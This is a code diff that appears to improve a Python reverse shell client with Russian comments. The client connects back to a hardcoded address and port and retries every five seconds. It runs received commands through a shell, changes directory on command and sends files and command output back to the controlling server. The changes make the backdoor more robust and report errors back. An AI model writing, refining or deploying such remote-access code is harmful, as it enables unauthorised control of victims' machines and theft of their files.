@@ -19,7 +19,7 @@ def reliable_recv():
         json_data = b""
         while True:
                 try:
-                        json_data = json_data + sock.recv(1024)
+                        json_data += sock.recv(1024)
                         return json.loads(json_data.decode())
                 except ValueError:
                         continue
@@ -31,8 +31,9 @@ def connection():
                 try:
                         sock.connect(("192.168.178.67", 54321))
                         shell()
+                        break
                 except:
-                        connection()
+                        time.sleep(5)
 
 #получает файлы, команды, выполняет и потом отправляет результаты на сервер
 def shell():
@@ -43,8 +44,9 @@ def shell():
                 elif command[:2] == "cd" and len(command) > 1:
                         try:
                                 os.chdir(command[:3].strip())
-                        except:
-                                pass
+                                reliable_send(f"[+] Переход в директорию: {os.getcwd()}")
+                        except Exception as e:
+                                reliable_send(f"[!!] Ошибка: {e}")
                 elif command[:8] == "download":
                         try:
                                 with open(command[9:], "rb") as file:
@@ -62,7 +64,7 @@ def shell():
                         try:
                                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin= subprocess.PIPE)
                                 result = proc.stdout.read() + proc.stderr.read()
-                                reliable_send(result.decode())
+                                reliable_send(result.decode(errors="ignore"))
                         except:
                                 reliable_send("[!!] Cant Execute That Command")
 
